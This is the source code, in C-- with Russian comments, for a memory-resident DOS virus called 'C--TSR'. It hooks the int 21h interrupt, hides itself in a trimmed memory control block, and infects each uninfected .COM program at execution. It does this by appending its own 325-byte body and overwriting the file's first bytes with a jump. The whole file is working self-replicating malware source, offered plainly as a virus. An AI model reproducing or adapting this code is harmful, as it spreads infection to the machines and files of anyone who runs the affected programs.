/* Простой резидентный .com вирус
   Свой MCB не создает...Меня добила процедура инсталляции (Z-MCB) на 10
 строчек и процедура заражения на 18 строчек :(  ),при том что дважды в
 память не инсталлится и повторно не заражает зараженные файлы. Естественно
 EXE файлы тоже не портит...
Name:	C--TSR
Size:	325
Type:	Trivial.Tsr.Com
*/

/* Описания флагов компилятора */
?alignword		0		/* Нет выравнивания по словам */
?argc			0		/* Нет процедуры обработки 
						коммандной строки */
?ctrl_c			0		/* Нет обработчика ctrl-c */
?parsecommandline	0		/* Аналогично argc */
?codesize				/* Оптимизация по размеру */
?resize			0		/* Нет процедуры изменения блока 
						памяти */
?jumptomain		short		/* Прыжок к main типа short */
?startaddress		0		/* org 0 */

/* Некоторые include */
?include "defs.h--"

/* Длина вируса..Не знаю как получить ее динамически... */
?define	vlen		325
?define	paravlen	vlen/16+1

/*---------------------------------------------------------------*/

byte	old[4] = {0x90,0xCD,0x20,0x90};	/* Первоначальный носитель */

byte	jmpc   = 0xE9;
word	jofs   = 0;
byte	mark   = 0x40;

word	old21[2] = {0,0};		/* Старый int 21h */
/*---------------------------------------------------------------*/
main()
{
	$Call getsi
getsi:	$pop  SI
	SI -= #getsi;			/* Получили дельту */
	BX = SI;
	SI += #old;
	DI = 0x100;
	$push DI

	$movsw				/* Восстановим носитель */
	$movsw				/* Можно циклом, но зачем ? */
	
	SI = BX;

/* === Инсталляция началась === */
	if ( @CHECKMEM() != 0)		/* Есть в памяти ? */
	 {
	  $push ES;
	  GETINTVECT(#old21+SI,0x21);	/* Получим int 21h */
          ES = DS - 1;			/* На наш MCB */
        while (ESBYTE[0] == 0x4D) ES = ES + ESWORD[3] + 1;
					/* Двигаемся по цепочке MCB */
          ESWORD[3] = ESWORD[3] - paravlen;
				/* Уменьшим найденый блок на наш размер */
	  ES = ES + ESWORD[3] + 1;	/* Туда,куда теперь указывает блок */
	  DI = 0; CX = vlen;
          $rep				/* Копируемся.Так и мельче и быстрее */
	  $movsb
	  SETINTVECT(,0x21,ES,#new21);	/* Установим int 21h */
	  $pop ES
	 }
/* === Инсталляция закончилась === */
}

interrupt new21()			/* Собственно наша резидентная часть */
{
 if (AX == check) { 			/* Нас тестируют на резидентность ? */
		AX = 0; 
		$iret;
		}
if (AH == 0x4B) {			/* Exec ? */
/* Процедура заражения */
 $pusha
 $push DS
  BX = FOPEN(2,,,DX);			/* Откроем файл на чтение/запись */
  if (BX != 0) {			
   DS = CS;				/* Наш кодовый сегмент */
   FREAD(,BX,4,#old);			/* Читаем 4 байта */
   if ((old[3] != 0x40) && (old[0] != 0x4D)) /* Не заражен и не Exe ? */
    {
     DI = FSEEK(2,BX,0,0);		/* на конец файла */
     FWRITE(,BX,vlen,0);		/* Пишим нас */
     FSEEK(0,BX,0,0);			/* На начало файла */
     jofs = DI-3;			/* Для Jmp */
     FWRITE(,BX,4,#jmpc);		/* Пишим Jmp */
    }
   FCLOSE(,BX);
  }
  $pop  DS
  $popa
/* Конец процедуры заражения */
 }
 $CS:
 $jmp FAR old21;			/* На старый обработчик */
}
